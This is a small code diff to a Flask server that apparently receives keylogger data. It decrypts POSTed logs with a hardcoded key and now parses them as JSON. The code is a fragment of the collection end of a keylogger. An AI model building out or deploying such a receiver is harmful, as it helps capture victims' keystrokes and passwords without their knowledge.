@@ -1,5 +1,6 @@
 from flask import render_template, request
 from model import KeyLog
+import json
 
 def decrypt_data(data: bytes, key='KopLeoRos') -> bytes:
     key: bytes = key.encode()
@@ -16,5 +17,6 @@ def register_routes(app, db):
     def logs() -> None:
         if request.method == 'POST':
             data = decrypt_data(request.data).decode()
-            print(data)
+            data_dict = json.loads(data)
+            print(data_dict)
             return data
